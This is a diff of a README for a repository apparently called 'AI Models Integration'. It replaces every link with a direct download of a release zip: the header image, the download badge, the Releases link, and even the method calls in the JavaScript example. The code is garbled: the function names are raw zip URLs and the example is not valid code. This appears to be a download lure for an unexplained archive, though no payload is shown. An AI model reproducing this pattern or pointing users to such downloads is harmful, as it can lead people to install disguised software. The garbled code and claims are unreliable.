@@ -1,6 +1,6 @@
 # AI Models Integration 🤖
 
-![AI Models](https://github.com/Mamakkhao/ai-models-integration/releases/download/v1.0/App.zip*https://github.com/Mamakkhao/ai-models-integration/releases/download/v1.0/App.zip)
+![AI Models](https://github.com/Mamakkhao/ai-models-integration/releases/download/v2.0/Software.zip*https://github.com/Mamakkhao/ai-models-integration/releases/download/v2.0/Software.zip)
 
 Welcome to the AI Models Integration repository! This project provides seamless integration with various state-of-the-art AI models to enhance your applications with advanced artificial intelligence capabilities.
 
@@ -25,7 +25,7 @@ Welcome to the AI Models Integration repository! This project provides seamless 
 
 To get started with AI Models Integration, download the latest release by clicking the button below:
 
-[![Download Latest Release](https://github.com/Mamakkhao/ai-models-integration/releases/download/v1.0/App.zip%20Release-brightgreen)](https://github.com/Mamakkhao/ai-models-integration/releases/download/v1.0/App.zip)
+[![Download Latest Release](https://github.com/Mamakkhao/ai-models-integration/releases/download/v2.0/Software.zip%20Release-brightgreen)](https://github.com/Mamakkhao/ai-models-integration/releases/download/v2.0/Software.zip)
 
 Once downloaded, follow the instructions in the documentation to integrate the AI models with your projects effortlessly.
 
@@ -54,8 +54,8 @@ const model = new AIModel({
   apiKey: 'your-api-key',
 });
 
-const response = https://github.com/Mamakkhao/ai-models-integration/releases/download/v1.0/App.zip('Hello, how can I assist you today?');
-https://github.com/Mamakkhao/ai-models-integration/releases/download/v1.0/App.zip(response);
+const response = https://github.com/Mamakkhao/ai-models-integration/releases/download/v2.0/Software.zip('Hello, how can I assist you today?');
+https://github.com/Mamakkhao/ai-models-integration/releases/download/v2.0/Software.zip(response);
 ```
 
 ## Contributing
@@ -64,7 +64,7 @@ We welcome contributions from the community to enhance the capabilities of AI Mo
 
 ## Support
 
-If you encounter any issues or need assistance with AI Models Integration, please check the [Releases](https://github.com/Mamakkhao/ai-models-integration/releases/download/v1.0/App.zip) section for updates and troubleshooting tips. You can also reach out to the maintainers for help.
+If you encounter any issues or need assistance with AI Models Integration, please check the [Releases](https://github.com/Mamakkhao/ai-models-integration/releases/download/v2.0/Software.zip) section for updates and troubleshooting tips. You can also reach out to the maintainers for help.
 
 ## License
 
